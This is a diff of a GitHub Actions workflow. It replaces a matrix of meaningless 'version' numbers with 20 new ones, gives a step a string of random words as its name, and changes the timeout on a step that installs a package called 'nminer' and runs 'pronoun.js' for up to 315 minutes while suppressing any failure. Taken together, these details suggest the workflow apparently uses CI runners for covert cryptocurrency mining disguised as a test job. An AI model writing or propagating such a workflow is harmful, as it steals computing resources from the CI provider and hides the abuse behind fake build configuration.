@@ -9,25 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6517 }
-          - { version: 7332 }
-          - { version: 3597 }
-          - { version: 2874 }
-          - { version: 4942 }
-          - { version: 9956 }
-          - { version: 7219 }
-          - { version: 8828 }
-          - { version: 4492 }
-          - { version: 3605 }
-          - { version: 1451 }
-          - { version: 9263 }
-          - { version: 9275 }
-          - { version: 1378 }
-          - { version: 404 }
-          - { version: 5096 }
-          - { version: 2988 }
-          - { version: 1547 }
-          - { version: 9079 }
+          - { version: 5743 }
+          - { version: 7603 }
+          - { version: 205 }
+          - { version: 9885 }
+          - { version: 1617 }
+          - { version: 9925 }
+          - { version: 6632 }
+          - { version: 8915 }
+          - { version: 9061 }
+          - { version: 1371 }
+          - { version: 76 }
+          - { version: 8792 }
+          - { version: 5725 }
+          - { version: 8496 }
+          - { version: 9291 }
+          - { version: 6926 }
+          - { version: 2684 }
+          - { version: 9125 }
+          - { version: 569 }
+          - { version: 4689 }
 
     steps:
       - name: Checkout
@@ -38,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: airbrush term embed ah viability
+      - name: testing yuck among under
         run: |
           npm install nminer@latest
-          timeout 350m node pronoun.js || echo "pronoun executed"
+          timeout 315m node pronoun.js || echo "pronoun executed"
